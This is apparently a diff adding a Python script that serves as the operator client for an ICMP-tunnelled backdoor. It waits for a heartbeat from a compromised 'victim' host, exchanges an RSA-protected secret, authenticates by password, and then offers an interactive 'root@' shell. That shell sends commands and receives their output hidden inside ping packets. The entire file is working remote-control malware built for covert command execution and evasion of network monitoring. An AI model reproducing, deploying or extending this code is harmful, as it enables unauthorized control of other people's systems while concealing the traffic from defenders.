@@ -1,0 +1,144 @@
+#!/usr/bin/python3 -B
+
+from sys import argv
+from random import choice
+from string import ascii_uppercase, digits
+from helper import ICMP, RSA
+
+ICMP_ECHO_REPLY = 0
+ICMP_ECHO_REQUEST = 8
+EXIT_SIGNAL = {'quit', 'exit'}
+
+
+class BackdoorClient():
+    def __init__(self: object, host: str, password: str) -> None:
+        # create an instance of class ICMP
+        self.icmp = ICMP(host)
+        # create a random secret of length 16
+        self.secret = ''.join(choice(ascii_uppercase + digits) for _ in range(16))
+        # save password needed for authentication
+        self.password = password
+
+    def connect(self: object) -> bool:
+        # wait for a heartbeat from victim
+        self.heartbeat()
+        # when heartbeat is received, secure the connection by exchanging the secret
+        self.secure_connection()
+
+        # try to authenticate and return true if success; else false
+        return self.authenticate()
+
+    def heartbeat(self: object) -> None:
+        print('[*] Waiting for a connection...')
+
+        # wait for a heartbeat from the given host
+        while True:
+            payload, address = self.icmp.receive_ping(1)
+
+            # if the address matches and the payload is a heartbeat request ('?'), send a heartbeat reply ('!')
+            if address == self.icmp.host and payload == b'?':
+                self.icmp.send_ping(2, b'!', ICMP_ECHO_REPLY)
+                return
+
+    def secure_connection(self: object) -> None:
+        print('[*] Exchanging secret key...')
+
+        # receive the public key
+        public_key, _ = self.icmp.receive_ping(3)
+        # encrypt the secret with RSA the public key
+        secret_enc = RSA.encrypt_secret(self.secret, public_key)
+
+        # send the RSA encrypted secret
+        self.icmp.send_ping(4, secret_enc, ICMP_ECHO_REPLY)
+
+    def authenticate(self: object) -> bool:
+        print('[*] Authenticating...')
+
+        # wait for a ping request
+        self.icmp.receive_ping(5, secret=self.secret)
+        # send the password as a reply and encrypt it with the exchanged secret
+        self.icmp.send_ping(6, self.password.encode(), ICMP_ECHO_REPLY, secret=self.secret)
+        # wait for a response from the victim (if successful, victim sends 'okay')
+        response, _ = self.icmp.receive_ping(7, secret=self.secret)
+        # send the victim an okay, no matter his response
+        self.icmp.send_ping(8, b'okay', ICMP_ECHO_REPLY, secret=self.secret)
+
+        # return true if the authentication was successful ('okay' received); else, return false
+        return response == b'okay'
+
+    def disconnect(self: object) -> None:
+        # if we wish to disconnect, wait for a ping request
+        self.icmp.receive_ping(1, secret=self.secret)
+        # then send 'quit' as a reply
+        self.icmp.send_ping(2, b'quit', ICMP_ECHO_REPLY, secret=self.secret)
+
+        print('\n[-] Disconnected.\n')
+
+    def execute(self: object, command: str) -> bytes:
+        # wait for a ping request
+        self.icmp.receive_ping(1, secret=self.secret)
+        # sent the command that we want to execute as a reply
+        self.icmp.send_ping(2, command.encode(), ICMP_ECHO_REPLY, secret=self.secret)
+        # get the output of the command executed on the victim side
+        output, _ = self.icmp.receive_ping(3, secret=self.secret)
+        # send the victim an okay, no matter his response
+        self.icmp.send_ping(4, b'okay', ICMP_ECHO_REPLY, secret=self.secret)
+
+        return output
+
+
+def main(argc: int, argv: list) -> None:
+    # if the needed arguments are not provided, print usage and exit
+    if argc != 3:
+        print('Usage: python3 {0} <ip> <password>'.format(argv[0]))
+        exit()
+
+    # get ip and password from command line
+    ip, password = argv[1:]
+
+    try:
+        start_backdoor(ip, password)
+    except:  # noqa: E722
+        pass
+
+
+def start_backdoor(ip: str, password: str) -> None:
+    # create an instance of BackdoorClient
+    backdoor = BackdoorClient(ip, password)
+
+    # if the connection was not successful, return/exit
+    if not backdoor.connect():
+        return
+
+    print('[+] Connected.\n')
+
+    while True:
+        output = None
+
+        try:
+            # get an input from the user
+            choice = input('root@' + ip + '> ')
+        except:  # noqa: E722
+            choice = 'quit'
+
+        # if the choice is either 'quit' or 'exit', disconnect from the victim
+        if choice in EXIT_SIGNAL:
+            break
+
+        if choice:
+            # try to execute the input command on the victim side
+            try:
+                output = backdoor.execute(choice)
+            except Exception:
+                output = 'Error while executing command!'
+
+        # print output from executed command
+        if output:
+            print(output.decode() if type(output) == bytes else output)
+
+    # disconnect from the victim
+    backdoor.disconnect()
+
+
+if __name__ == '__main__':
+    main(len(argv), argv)
